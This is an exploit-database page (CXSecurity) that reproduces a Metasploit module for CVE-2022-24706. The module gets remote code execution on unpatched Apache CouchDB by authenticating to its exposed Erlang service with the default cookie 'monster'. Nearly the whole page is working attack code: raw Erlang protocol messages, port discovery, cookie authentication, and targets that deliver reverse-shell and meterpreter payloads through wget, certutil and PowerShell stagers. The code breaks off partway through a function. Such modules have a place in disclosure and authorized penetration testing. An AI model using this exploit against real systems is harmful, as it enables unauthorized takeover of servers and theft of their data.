---
title: Apache CouchDB Erlang Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2022110003
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-03
fetch_date: 2025-10-03T21:36:18.025478
---

# Apache CouchDB Erlang Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Apache CouchDB Erlang Remote Code Execution** **2022.11.02**  Credit:  **[1F98D](https://cxsecurity.com/author/1F98D/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-24706](https://cxsecurity.com/cveshow/CVE-2022-24706/ "Click to see CVE-2022-24706")**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::Tcp
include Msf::Exploit::CmdStager
include Msf::Exploit::Retry
include Msf::Exploit::Powershell
prepend Msf::Exploit::Remote::AutoCheck
require 'msf/core/exploit/powershell'
require 'digest'
# Constants required for communicating over the Erlang protocol defined here:
# https://www.erlang.org/doc/apps/erts/erl\_dist\_protocol.html
EPM\_NAME\_CMD = "\x00\x01\x6e".freeze
NAME\_MSG = "\x00\x15n\x00\x07\x00\x03\x49\x9cAAAAAA@AAAAAAA".freeze
CHALLENGE\_REPLY = "\x00\x15r\x01\x02\x03\x04".freeze
CTRL\_DATA = "\x83h\x04a\x06gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03\x00\x00\x00\x00\x00w\x00w\x03rex".freeze
COOKIE = 'monster'.freeze
COMMAND\_PREFIX = "\x83h\x02gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03\x00\x00\x00\x00\x00h\x05w\x04callw\x02osw\x03cmdl\x00\x00\x00\x01k".freeze
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Apache Couchdb Erlang RCE',
'Description' => %q{
In Apache CouchDB prior to 3.2.2, an attacker can access an improperly secured default installation without
authenticating and gain admin privileges.
},
'Author' => [
'Milton Valencia (wetw0rk)', # Erlang Cookie RCE discovery
'1F98D', # Erlang Cookie RCE exploit
'Konstantin Burov', # Apache CouchDB Erlang Cookie exploit
'\_sadshade', # Apache CouchDB Erlang Cookie exploit
'jheysel-r7', # Msf Module
],
'References' => [
[ 'EDB', '49418' ],
[ 'URL', 'https://github.com/sadshade/CVE-2022-24706-CouchDB-Exploit'],
[ 'CVE', '2022-24706'],
],
'License' => MSF\_LICENSE,
'Platform' => ['win', 'linux'],
'Payload' => {
'MaxSize' => 60000 # Due to the 16-bit nature of the cmd in the compile\_cmd method
},
'Privileged' => false,
'Arch' => [ ARCH\_CMD ],
'Targets' => [
[
'Unix Command',
{
'Platform' => 'unix',
'Arch' => ARCH\_CMD,
'Type' => :unix\_cmd,
'DefaultOptions' => {
'PAYLOAD' => 'cmd/unix/reverse\_openssl'
}
}
],
[
'Linux Dropper',
{
'Platform' => 'linux',
'Arch' => [ARCH\_X86, ARCH\_X64],
'Type' => :linux\_dropper,
'CmdStagerFlavor' => :wget,
'DefaultOptions' => {
'PAYLOAD' => 'linux/x86/meterpreter\_reverse\_tcp'
}
}
],
[
'Windows Command',
{
'Platform' => 'win',
'Arch' => ARCH\_CMD,
'Type' => :win\_cmd,
'DefaultOptions' => {
'PAYLOAD' => 'cmd/windows/powershell\_reverse\_tcp'
}
}
],
[
'Windows Dropper',
{
'Arch' => [ARCH\_X86, ARCH\_X64],
'Type' => :win\_dropper,
'CmdStagerFlavor' => :certutil,
'DefaultOptions' => {
'PAYLOAD' => 'windows/x64/meterpreter\_reverse\_tcp'
}
}
],
[
'PowerShell Stager',
{
'Arch' => [ARCH\_X86, ARCH\_X64],
'Type' => :psh\_stager,
'CmdStagerFlavor' => :certutil,
'DefaultOptions' => {
'PAYLOAD' => 'windows/x64/meterpreter/reverse\_tcp'
}
}
]
],
'DefaultTarget' => 0,
'DisclosureDate' => '2022-01-21',
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [IOC\_IN\_LOGS, ARTIFACTS\_ON\_DISK]
}
),
)
register\_options(
[
Opt::RPORT(4369)
]
)
end
def check
erlang\_ports = get\_erlang\_ports
# If get\_erlang\_ports does not return an array of port numbers, the target is not vulnerable.
return Exploit::CheckCode::Safe('This endpoint does not appear to expose any erlang ports') if erlang\_ports.empty?
erlang\_ports.each do |erlang\_port|
# If connect\_to\_erlang\_server returns a socket, it means authentication with the default cookie has been
# successful and the target as well as the specific socket used in this instance is vulnerable
sock = connect\_to\_erlang\_server(erlang\_port.to\_i)
if sock.instance\_of?(Socket)
@vulnerable\_socket = sock
return Exploit::CheckCode::Vulnerable('Successfully connected to the Erlang Server with cookie: "monster"')
else
next
end
end
Exploit::CheckCode::Safe('This endpoint has an exposed erlang port(s) but appears to be a patched')
end
# Connect to the Erlang Port Mapper Daemon to collect port numbers of running Erlang servers
#
# @return [Array] An array of port numbers for discovered Erlang Servers.
def get\_erlang\_ports
erlang\_ports = []
begin
print\_status("Attempting to connect to the Erlang Port Mapper Daemon (EDPM) socket at: #{datastore['RHOSTS']}:#{datastore['RPORT']}...")
connect(true, { 'RHOST' => datastore['RHOSTS'], 'RPORT' => datastore['RPORT'] })
# request Erlang nodes
sock.put(EPM\_NAME\_CMD)
sleep datastore['WfsDelay']
res = sock.get\_once
unless res && res.include?("\x00\x00\x11\x11name couchdb")
print\_error('Did not find any Erlang nodes')
return erlang\_ports
end
print\_status('Successfully found EDPM socket')
res.each\_line do |line|
erlang\_ports << line.match(/\s(\d+$)/)[0]
end
rescue ::Rex::ConnectionError, ::EOFError, ::Errno::ECONNRESET => e
print\_error("Error connecting to EDPM: #{e.class} #{e}")
disconnect
return erlang\_ports
end
erlang\_ports
end
# Attempts to connect to an erlang server with a default erlang cookie of 'monster', which is the
# default erlang cookie value in Apache CouchDB installations before 3.2.2
#
# @return [Socket] Returns a socket that is connected and already authenticated to the vulnerable Apache CouchDB Erlang Server
def connect\_to\_erlang\_server(erlang\_port)
print\_status('Attempting to connect to the Erlang Server with an Erlang Server Cookie value of "monster" (default in vulnerable instances of Apache CouchDB)...')
connect(true, { 'RHOST' => datastore['RHOSTS'], 'RPORT' => erlang\_port })
print\_status('Connection successful')
challenge = retry\_until\_truthy(timeout: 60) do
sock.put(NAME\_MSG)
sock.get\_once(5) # ok message
sock.get\_once
end
# The expected successful response from the target should start with \x00\x1C
unless challenge && challenge.include?("\x00\x1C")
print\_error('Connecting to the Erlang server was unsuccessfu...